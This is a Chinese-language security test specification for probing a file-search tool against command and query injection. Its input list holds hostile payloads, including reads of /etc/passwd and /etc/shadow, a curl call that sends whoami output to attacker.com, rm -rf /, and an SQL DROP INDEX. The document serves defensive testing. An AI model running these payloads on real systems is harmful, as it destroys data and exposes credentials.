# Security Probe S_I_01: Query Injection

## 探针类型
注入攻击测试 (Injection)

## 测试目标
验证 file-search 工具是否能抵御通过搜索查询字符串进行的命令注入或查询语言注入攻击。攻击者可能在搜索词中嵌入 shell 元字符、路径遍历符或特殊查询操作符来操纵搜索行为或执行未预期的操作。

## 探针设计

### 输入构造
- **攻击场景**: 用户通过搜索接口提交包含恶意 payload 的查询字符串，试图将搜索操作从合法范围转向任意文件读取或命令执行
- **输入数据**:
  - `; cat /etc/passwd #`
  - `$(id)`
  - `` `curl attacker.com/$(whoami)` ``
  - `foo | head -100 /etc/shadow`
  - `../../../etc/passwd`
  - `*; rm -rf / --no-preserve-root`
  - `foo" && dir C:\Users\Administrator\NTDS.dit`
  - `'; DROP INDEX search_idx; --`
- **输入方式**: 通过搜索查询 API 端点或 CLI 参数提交

### 执行步骤
1. **准备阶段**: 建立 file-search 运行环境，准备测试文档库，记录初始状态
2. **执行阶段**: 逐一提交各个恶意查询 payload，记录每次请求的响应和系统状态
3. **分析阶段**: 检查搜索结果是否包含预期之外的文件内容；检查服务日志中是否有命令执行痕迹；检查系统是否有被修改的文件
4. **判定阶段**: 根据响应内容判断是否存在注入漏洞

## 预期行为
- 搜索查询字符串应被严格转义或参数化处理
- 特殊字符（如 `;`, `|`, `$`, `` ` ``, `&&`, `'`）不应被传递给底层 shell 或查询引擎
- 搜索结果不应包含 `/etc/passwd` 等系统敏感文件（除非索引明确包含这些文件）
- 服务进程不应执行查询字符串中嵌入的命令
- 日志中不应出现命令被执行或 shell 被调用的证据

## 判定标准
- **通过**: 所有注入 payload 均被安全处理，无命令执行或无权限越界搜索结果
- **失败**: 任一 payload 导致了非预期的命令执行、敏感文件读取或索引损坏
